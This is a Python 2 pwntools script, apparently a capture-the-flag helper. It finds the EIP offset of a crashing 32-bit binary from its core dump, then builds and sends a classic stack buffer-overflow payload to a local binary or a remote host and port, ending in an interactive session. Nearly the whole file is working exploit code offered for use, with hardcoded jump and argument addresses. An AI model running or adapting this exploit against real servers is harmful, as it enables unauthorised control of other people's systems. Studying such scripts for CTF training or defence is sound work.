#!/usr/bin/python2.7
# coding=utf-8

#
# Script that uses pwntool to do one of the followings:
#   * Compute the EIP offset of a local file generating segmentation fault (option -o)
#   * Exploit a local binary that is subject to simple buffer overflow (option -l) 
#   * Exploit a remote server vulnerable to simple buffer overflow (option -r)
#
# Example of usage:
#   // Just compute the EIP offset of a local binary file
#   python2.7 pwn-script.py -o <file-path> 
#   
#   // Exploit a local binary file without knowing the EIP offsett
#   python2.7 pwn-script.py -l <file-path>
#
#   // Exploit a local binary file knowing the EIP offset
#   python2.7 pwn-script.py -l <file-path> -O 188
#
#   // Exploit a remote binary file knowing the EIP offset
#   python2.7 pwn-script.py -r <hostname/IP> -p <port> -O 188
#

# TODO: sposta s_addr, r_addr, etc. come input parameters invece di hardcoded

from pwn import *
import sys
import argparse
from termcolor import colored

# ============= EDIT THIS VALUES BEFORE RUNNING  ============= #
s_addr = 0x80491e2      # Required
r_addr = 0x080492fe     # Optional
a1_addr = 0xdeadbeef    # Optional
a2_addr = 0xc0ded00d    # Optional
# ============ ============ ============ ============ ======== #


def get_offset(binary):
    context.binary = binary 
    conn = process(context.binary.path)

    # Generate the segmentation fault
    conn.sendline(cyclic(1024))
    conn.wait()

    # Analyse the coredump to get the return address
    core = Coredump("./core")
    offset = cyclic_find(core.fault_addr)
    
    log.info("EIP offset found: {}".format(offset))    

    conn.close()
    return offset

def get_payload(offset):
    payload = ''
    payload += 'A'*offset   # fills the memory till the EIP
    payload += p32(s_addr)  # addr of the function to execute (that will override EIP)
    if r_addr is not None:
        payload += p32(r_addr)  # return addr
    if a1_addr is not None:
        payload += p32(a1_addr)    # addr of arg1
    if a2_addr is not None:
        payload += p32(a2_addr)    # addr of arg2
    payload += '\n'

    return payload

def exploit(scope, offset, target, port, verbose, progr):
    if scope == "l":
        context.binary = target 
        conn = process(context.binary.path)
    if scope == "r":
        conn =  remote(target, port)

    payload = get_payload(offset)
    
    if verbose:
        # Print payload to a file
        fname="pwn.bin"
        f = open(fname, 'wb')
        f.write(payload)
        f.close()
        print "[{}] > Payload written to {}".format(progr,fname) 

    conn.recvuntil(': \n')
    conn.sendline(payload)
    conn.interactive()
    return

if __name__ == '__main__':

    # Set DEBUG mode for verbose output
    #context.log_level =  "DEBUG"

    # Parse command line arguments
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    main_grp = parser.add_mutually_exclusive_group(required=True)
    main_grp.add_argument("-o", "--compute-offset", metavar="BINARY FILE", required=False, help="Compute the EIP (Instruction Pointer) offset of a local binary file")
    main_grp.add_argument("-l", "--exploit-locally", metavar="BINARY FILE", required=False, help="Exploit a local binary. Requires s_addr varible set")
    main_grp.add_argument("-r", "--exploit-remotely", metavar="HOSTNAME", required=False, help="Exploit a remote hostname/IP. Requires -p/--port and -O/--given-offse set")
    parser.add_argument("-p", "--port", type = int, required=False, help="Port of the remote host to exploit") # nargs='?', nargs = '+'
    parser.add_argument("-O", "--given-offset", metavar="OFFSET", type=int, required=False, help="Specify the offset for the EIP (Instraction Pointer)")
    parser.add_argument("-v", "--verbose", action="store_true", required=False, help="Verbose output (i.e., write payload in a file)")
    args = parser.parse_args()
    progr = colored(sys.argv[0], 'yellow')

    # ==== -r ==== #
    if args.exploit_remotely is not None:
        # ==== -p ==== #
        if args.port is None:
            print "[{}] > Error: remote port not specified. Use the -p/--port option to specify the port of the remote host to exploit.".format(progr) 
            sys.exit(1)
        # ==== -O ==== #
        if args.given_offset is None:
            print "[{}] > Error: EIP offset not specified. Use the -O/--given-offset option to specify the EIP offset.".format(progr) 
            sys.exit(1)

        print "[{}] > Exploiting the remote host '{}:{}' at the EIP offset '{}'".format(progr, args.exploit_remotely, args.port, args.given_offset)
        exploit("r", args.given_offset, args.exploit_remotely, args.port, args.verbose, progr)
        sys.exit(0)

    # ==== -l ==== #
    if args.exploit_locally is not None:
        # Check if file exists
        if not os.path.isfile(args.exploit_locally):
            print "[{}] > Error: file '{}' not found.".format(progr, args.exploit_locally)
            sys.exit(1)
        file_path = os.path.abspath(args.exploit_locally)
        print "[{}] > File '{}' located.".format(progr, file_path)

        # ==== -O ==== #
        if args.given_offset is None:
            # Compute offset since not given
            print "[{}] > Computing the EIP offset...".format(progr)
            off = get_offset(file_path)
        else:
            off = args.given_offset

        print "[{}] > Exploiting the local file '{}' at the EIP offset '{}'".format(progr, file_path, off)
        exploit("l", off, file_path, None, args.verbose, progr)
        sys.exit(0)

    # ==== -o ==== #
    if args.compute_offset is not None:
        # Check if file exists
        if not os.path.isfile(args.compute_offset):
            print "[{}] > Error: file '{}' not found.".format(progr, args.compute_offset)
            sys.exit(1)
        file_path = os.path.abspath(args.compute_offset)
        print "[{}] > File '{}' located.".format(progr, file_path)
        print "[{}] > Computing the EIP offset...".format(progr)
        off = get_offset(file_path)
        sys.exit(0)
